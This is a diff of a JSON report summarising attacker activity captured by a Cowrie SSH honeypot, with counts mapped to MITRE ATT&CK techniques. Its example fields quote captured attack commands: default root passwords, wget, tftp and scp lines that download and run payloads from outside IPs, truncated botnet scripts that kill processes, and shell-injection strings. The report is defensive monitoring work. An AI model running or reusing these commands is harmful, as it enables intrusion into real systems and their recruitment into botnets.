@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-15 19:00:12",
+  "generated": "2026-09-15 20:03:12",
   "totals": {
-    "commands": 4025,
-    "login_failed": 6318,
-    "login_success": 1261,
-    "sessions": 6211
+    "commands": 4132,
+    "login_failed": 6344,
+    "login_success": 1271,
+    "sessions": 6257
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 6318,
+      "count": 6344,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-09-15T00:01:09.372940Z",
-      "last": "2026-09-15T18:59:07.764050Z",
-      "unique_ips": 86
+      "last": "2026-09-15T20:02:50.653856Z",
+      "unique_ips": 91
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1261,
+      "count": 1271,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123456",
@@ -37,14 +37,14 @@
         "root / root123"
       ],
       "first": "2026-09-15T00:08:25.379657Z",
-      "last": "2026-09-15T18:38:07.658097Z",
-      "unique_ips": 63
+      "last": "2026-09-15T19:54:52.993108Z",
+      "unique_ips": 68
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 1156,
+      "count": 1167,
       "examples": [
         "ls /home; /bin/busybox BOTNET",
         "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   ",
@@ -52,14 +52,14 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-15T01:59:58.939321Z",
-      "last": "2026-09-15T15:19:47.683989Z",
-      "unique_ips": 5
+      "last": "2026-09-15T19:34:53.056678Z",
+      "unique_ips": 6
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 111,
+      "count": 127,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -68,14 +68,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T18:00:38.656277Z",
-      "unique_ips": 12
+      "last": "2026-09-15T19:22:49.922535Z",
+      "unique_ips": 13
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 56,
+      "count": 75,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -84,34 +84,34 @@
         "wget http://102.220.160.204/wget.sh -O- | sh;tftp -g102.220.160.204 -r tftp.sh -l- | sh;/bin/busybox wget http://102.220"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T18:00:38.656277Z",
-      "unique_ips": 12
+      "last": "2026-09-15T19:35:06.794320Z",
+      "unique_ips": 14
     },
     {
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 22,
+      "count": 33,
       "examples": [
         "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   ",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-15T08:52:31.972190Z",
-      "last": "2026-09-15T15:19:47.683989Z",
-      "unique_ips": 4
+      "last": "2026-09-15T19:34:53.056678Z",
+      "unique_ips": 5
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 20,
+      "count": 30,
       "examples": [
         "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
       ],
       "first": "2026-09-15T08:52:31.972190Z",
-      "last": "2026-09-15T09:14:35.183990Z",
-      "unique_ips": 2
+      "last": "2026-09-15T19:34:53.056678Z",
+      "unique_ips": 3
     },
     {
       "id": "T1082",
@@ -133,15 +133,28 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 11,
       "examples": [
         "id",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-15T01:24:06.195363Z",
-      "last": "2026-09-15T17:59:46.690572Z",
-      "unique_ips": 10
+      "last": "2026-09-15T19:21:58.160233Z",
+      "unique_ips": 11
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 4,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+      ],
+      "first": "2026-09-15T09:46:16.277084Z",
+      "last": "2026-09-15T19:19:48.515224Z",
+      "unique_ips": 3
     },
     {
       "id": "T1059.004",
@@ -154,19 +167,6 @@
       ],
       "first": "2026-09-15T09:46:16.277084Z",
       "last": "2026-09-15T15:19:47.683989Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 3,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
-      ],
-      "first": "2026-09-15T09:46:16.277084Z",
-      "last": "2026-09-15T14:51:03.981172Z",
       "unique_ips": 3
     },
     {
@@ -209,15 +209,15 @@
   "unmapped": [
     [
       "system",
-      1194
+      1200
     ],
     [
       "sh",
-      1192
+      1197
     ],
     [
       "shell",
-      60
+      65
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -225,19 +225,19 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      33
+      36
     ],
     [
       "enable",
-      30
+      32
     ],
     [
       "sh 0",
-      20
+      30
     ],
     [
       "/bin/busybox",
-      17
+      29
     ],
     [
       "/bin/busybox LZRD",
@@ -245,7 +245,11 @@
     ],
     [
       "linuxshell",
-      10
+      12
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      11
     ],
     [
       "zalee",
@@ -260,32 +264,28 @@
       10
     ],
     [
-      "cd /proc && cat self/cmdline",
-      9
-    ],
-    [
       "enablelinuxshell",
-      7
+      8
     ],
     [
       "ping ;sh",
-      7
+      8
     ],
     [
       "!v54!",
-      4
+      6
     ],
     [
       "ping; sh",
-      2
+      3
     ],
     [
       "Ruckus",
-      2
+      3
     ],
     [
       "\";/bin/sh;\"",
-      2
+      3
     ]
   ]
 }
